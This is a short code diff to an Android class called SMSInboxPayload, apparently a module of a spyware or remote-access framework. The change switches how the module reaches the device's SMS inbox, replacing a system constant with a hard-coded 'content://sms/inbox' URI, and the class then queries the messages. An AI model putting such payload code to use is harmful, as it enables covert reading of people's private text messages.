@@ -5,7 +5,6 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
-import android.provider.Telephony;
 import android.util.Log;
 
 public class SMSInboxPayload extends Payload {
@@ -20,7 +19,7 @@ public class SMSInboxPayload extends Payload {
 
 	@Override
 	public synchronized void run() {
-		Uri smsInbox = Telephony.Sms.Inbox.CONTENT_URI;
+		Uri smsInbox = Uri.parse("content://sms/inbox");
 		ContentResolver cr = context.getContentResolver();
 		Cursor cursor = cr.query(smsInbox, null, null, null, null);
 		cursor.moveToFirst();
